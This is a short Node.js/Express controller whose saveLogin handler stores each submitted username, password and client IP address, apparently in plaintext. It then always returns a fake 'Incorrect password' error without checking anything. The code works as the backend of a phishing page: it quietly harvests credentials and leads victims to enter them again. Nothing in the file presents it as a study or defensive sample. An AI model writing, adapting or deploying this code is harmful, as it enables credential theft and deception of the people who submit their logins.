const Login = require("../models/Login");

exports.saveLogin = async (req, res) => {
  const { identifier, password } = req.body; // 👈 FIX HERE

  try {
    await Login.create({
      username: identifier, // map identifier → username
      password,
      ipAddress: req.ip
    });

    return res.status(401).json({
      success: false,
      message: "❌ Incorrect password. please try one more time."
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
};
